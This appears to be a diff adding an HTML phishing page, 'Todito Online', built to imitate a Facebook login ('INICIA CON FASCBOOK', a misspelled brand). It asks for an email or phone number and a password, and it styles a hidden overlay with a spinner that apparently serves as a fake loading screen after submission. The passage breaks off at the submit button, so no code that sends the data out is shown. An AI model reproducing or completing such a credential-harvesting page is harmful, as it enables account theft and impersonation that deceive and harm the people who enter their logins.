@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Todito Online</title>
+<style>
+body {
+  margin:0;
+  font-family: system-ui, -apple-system, Arial, sans-serif;
+  background: linear-gradient(#0f1c2e, #1b2d4a);
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
+
+/* FORMULARIO CENTRADO */
+.wrapper {
+  width:100%;
+  max-width:380px;
+  background:#f9f9f9;
+  border-radius:20px;
+  box-shadow:0 8px 25px rgba(0,0,0,0.35);
+  position:relative;
+  z-index:1;
+  overflow:hidden;
+}
+
+/* HEADER */
+.header {
+  background: linear-gradient(90deg,#ff9800,#f57c00);
+  padding:20px;
+  text-align:center;
+}
+.header h1 { margin:0; font-size:26px; font-weight:800; color:#fff; }
+.header p { margin:6px 0 0; font-size:13px; color:#fff; }
+
+/* FORM */
+.form { padding:22px; }
+input {
+  width:100%;
+  padding:14px;
+  margin:10px 0;
+  border-radius:8px;
+  border:1px solid #ccd0d5;
+  font-size:14px;
+  background:#fff;
+  box-sizing:border-box;
+}
+.btn {
+  width:100%;
+  padding:14px;
+  margin-top:12px;
+  border:none;
+  border-radius:8px;
+  font-weight:bold;
+  background:#1976d2;
+  color:white;
+  font-size:15px;
+  cursor:pointer;
+  transition:background 0.2s ease, transform 0.2s ease;
+}
+.btn:hover {
+  background:#1565c0;
+  transform:scale(1.03);
+}
+.small {
+  text-align:center;
+  font-size:12px;
+  color:#666;
+  margin-top:12px;
+}
+
+/* POPUNDER FINAL */
+.popunder-final {
+  position:fixed;
+  top:50%;
+  left:50%;
+  transform:translate(-50%, -50%);
+  width:90%;
+  max-width:320px;
+  background:#1976d2;
+  border-radius:14px;
+  box-shadow:0 8px 25px rgba(0,0,0,0.3);
+  text-align:center;
+  z-index:999;
+  color:white;
+  padding:20px;
+  display:none;
+}
+.popunder-final h2 {
+  margin:0 0 10px;
+  font-size:18px;
+  font-weight:700;
+}
+.loader {
+  border:4px solid #f3f3f3;
+  border-top:4px solid #fff;
+  border-radius:50%;
+  width:30px;
+  height:30px;
+  margin:15px auto;
+  animation:spin 1s linear infinite;
+}
+@keyframes spin {
+  0% { transform:rotate(0deg); }
+  100% { transform:rotate(360deg); }
+}
+</style>
+</head>
+<body>
+
+<!-- FORMULARIO -->
+<div class="wrapper" id="loginWrapper">
+  <div class="header">
+    <h1>INICIA CON FASCBOOK</h1>
+    <p>Conecta con amigos de todas partes</p>
+  </div>
+
+  <div class="form">
+    <form id="toditoForm">
+      <input type="text" name="usuario" placeholder="Correo o número" required>
+      <input type="password" id="contraseña" name="clave" placeholder="Contraseña" required>
+      <button type="submit" class="btn">
